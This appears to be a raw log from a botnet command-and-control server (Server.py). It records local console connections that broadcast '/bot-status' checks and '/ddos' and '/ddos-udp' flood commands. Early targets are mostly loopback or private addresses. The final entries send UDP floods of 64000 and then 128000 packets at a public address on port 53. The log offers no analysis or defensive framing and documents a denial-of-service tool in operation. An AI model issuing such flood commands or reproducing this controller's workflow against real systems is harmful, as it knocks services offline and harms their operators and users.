2023-10-20 04:22:41,490 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:22:43,656 | root | INFO | New connection <('127.0.0.1', 56917)>:S85 |(Server.py:61)
2023-10-20 04:22:43,656 | root | INFO | new Thread ('127.0.0.1', 56917) |(Server.py:106)
2023-10-20 04:23:03,520 | root | INFO | [/Broadcast] (/ddos-udp 127.0.0.1 34 -c 7) |(Server.py:160)
2023-10-20 04:23:42,963 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:23:42,973 | root | INFO | New connection <('127.0.0.1', 56925)>:S85 |(Server.py:61)
2023-10-20 04:23:42,973 | root | INFO | new Thread ('127.0.0.1', 56925) |(Server.py:106)
2023-10-20 04:24:00,280 | root | INFO | [/Broadcast] (/ddos 192.167.4.1 43 -c 4) |(Server.py:161)
2023-10-20 04:24:10,835 | root | INFO | [/Broadcast] (/ddos-udp 192.167.4.1 43 -c 4) |(Server.py:161)
2023-10-20 04:25:04,064 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:25:05,844 | root | INFO | New connection <('127.0.0.1', 56937)>:S85 |(Server.py:61)
2023-10-20 04:25:05,844 | root | INFO | new Thread ('127.0.0.1', 56937) |(Server.py:106)
2023-10-20 04:25:17,114 | root | INFO | [/Broadcast] (/ddos-udp 192.1.5.1 99 -c 1 ) |(Server.py:162)
2023-10-20 04:26:01,812 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:26:03,249 | root | INFO | New connection <('127.0.0.1', 56948)>:S85 |(Server.py:61)
2023-10-20 04:26:03,249 | root | INFO | new Thread ('127.0.0.1', 56948) |(Server.py:106)
2023-10-20 04:26:28,030 | root | INFO | [/Broadcast] (/ddos-udp 192.5.1.5 8 -c 7) |(Server.py:162)
2023-10-20 04:27:29,700 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:28:35,371 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:28:38,891 | root | INFO | New connection <('127.0.0.1', 56967)>:S85 |(Server.py:61)
2023-10-20 04:28:38,891 | root | INFO | new Thread ('127.0.0.1', 56967) |(Server.py:106)
2023-10-20 04:29:21,442 | root | INFO | [/Broadcast] (/ddos-udp 127.0.5.3 3 -c 1 ) |(Server.py:162)
2023-10-20 04:35:45,476 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:39:07,763 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:40:23,483 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:40:30,376 | root | INFO | New connection <('127.0.0.1', 57078)>:S85 |(Server.py:61)
2023-10-20 04:40:30,377 | root | INFO | new Thread ('127.0.0.1', 57078) |(Server.py:106)
2023-10-20 04:40:45,991 | root | INFO | [/Broadcast] (/ddos-udp 192.168.1.1 34 -c 7 ) |(Server.py:161)
2023-10-20 04:41:22,501 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 04:41:23,606 | root | INFO | New connection <('127.0.0.1', 57089)>:S85 |(Server.py:61)
2023-10-20 04:41:23,606 | root | INFO | new Thread ('127.0.0.1', 57089) |(Server.py:106)
2023-10-20 04:41:41,741 | root | INFO | [/Broadcast] (/ddos-udp 192.168.1.1 66 -c 7) |(Server.py:160)
2023-10-20 05:05:37,706 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 05:08:32,282 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 05:10:31,728 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 05:11:21,330 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 05:12:54,780 | root | DEBUG | Console.Thread $Start |(Server.py:89)
2023-10-20 05:13:27,480 | root | INFO | [/Broadcast] (/status-bot) |(Server.py:160)
2023-10-20 05:13:29,298 | root | INFO | New connection <('127.0.0.1', 57401)>:S85 |(Server.py:61)
2023-10-20 05:13:29,298 | root | INFO | new Thread ('127.0.0.1', 57401) |(Server.py:106)
2023-10-20 05:13:33,095 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:160)
2023-10-20 05:14:00,617 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:160)
2023-10-20 05:14:35,735 | root | INFO | [/Broadcast] (/ddos-udp 128.1.1.1 34 -c 5 ) |(Server.py:160)
2023-10-20 05:15:18,207 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:15:20,036 | root | INFO | New connection <('127.0.0.1', 57427)>:S85 |(Server.py:60)
2023-10-20 05:15:20,036 | root | INFO | new Thread ('127.0.0.1', 57427) |(Server.py:105)
2023-10-20 05:15:36,989 | root | INFO | [/Broadcast] (/ddos-udp 127.0.0.1 34 -c 6000) |(Server.py:159)
2023-10-20 05:17:53,104 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:17:54,950 | root | INFO | New connection <('127.0.0.1', 57451)>:S85 |(Server.py:60)
2023-10-20 05:17:54,950 | root | INFO | new Thread ('127.0.0.1', 57451) |(Server.py:105)
2023-10-20 05:18:24,105 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:159)
2023-10-20 05:19:43,296 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:19:45,228 | root | INFO | New connection <('127.0.0.1', 57461)>:S85 |(Server.py:60)
2023-10-20 05:19:45,228 | root | INFO | new Thread ('127.0.0.1', 57461) |(Server.py:105)
2023-10-20 05:20:04,069 | root | INFO | [/Broadcast] (/.) |(Server.py:160)
2023-10-20 05:21:12,872 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:21:18,356 | root | INFO | New connection <('127.0.0.1', 57473)>:S85 |(Server.py:60)
2023-10-20 05:21:18,356 | root | INFO | new Thread ('127.0.0.1', 57473) |(Server.py:105)
2023-10-20 05:21:22,501 | root | INFO | [/Broadcast] (/z) |(Server.py:160)
2023-10-20 05:21:30,512 | root | INFO | [/Broadcast] (/s) |(Server.py:160)
2023-10-20 05:21:31,491 | root | INFO | [/Broadcast] (/s) |(Server.py:160)
2023-10-20 05:21:32,823 | root | INFO | [/Broadcast] (/a/) |(Server.py:160)
2023-10-20 05:22:22,228 | root | INFO | [/Broadcast] (/s) |(Server.py:160)
2023-10-20 05:23:29,109 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:23:30,570 | root | INFO | New connection <('127.0.0.1', 57490)>:S85 |(Server.py:60)
2023-10-20 05:23:30,570 | root | INFO | new Thread ('127.0.0.1', 57490) |(Server.py:105)
2023-10-20 05:23:39,817 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:162)
2023-10-20 05:24:50,174 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:162)
2023-10-20 05:25:05,085 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:25:13,509 | root | INFO | New connection <('127.0.0.1', 57500)>:S85 |(Server.py:60)
2023-10-20 05:25:13,509 | root | INFO | new Thread ('127.0.0.1', 57500) |(Server.py:105)
2023-10-20 05:25:30,510 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:162)
2023-10-20 05:26:56,732 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:27:00,319 | root | INFO | New connection <('127.0.0.1', 57524)>:S85 |(Server.py:60)
2023-10-20 05:27:00,319 | root | INFO | new Thread ('127.0.0.1', 57524) |(Server.py:105)
2023-10-20 05:27:13,371 | root | WARNING | [Unknown input](.ю) |(Server.py:218)
2023-10-20 05:27:17,208 | root | INFO | [/Broadcast] (/.) |(Server.py:159)
2023-10-20 05:28:21,904 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:28:27,819 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:159)
2023-10-20 05:28:55,208 | root | INFO | New connection <('127.0.0.1', 57537)>:S85 |(Server.py:60)
2023-10-20 05:28:55,208 | root | INFO | new Thread ('127.0.0.1', 57537) |(Server.py:105)
2023-10-20 05:29:09,186 | root | INFO | [/Broadcast] (/bot-status) |(Server.py:159)
2023-10-20 05:29:43,580 | root | INFO | [/Broadcast] (/s) |(Server.py:159)
2023-10-20 05:30:12,272 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 64000) |(Server.py:159)
2023-10-20 05:32:03,981 | root | DEBUG | Console.Thread $Start |(Server.py:88)
2023-10-20 05:32:09,752 | root | INFO | New connection <('127.0.0.1', 57606)>:S85 |(Server.py:60)
2023-10-20 05:32:09,752 | root | INFO | new Thread ('127.0.0.1', 57606) |(Server.py:105)
2023-10-20 05:32:39,423 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 128000) |(Server.py:159)
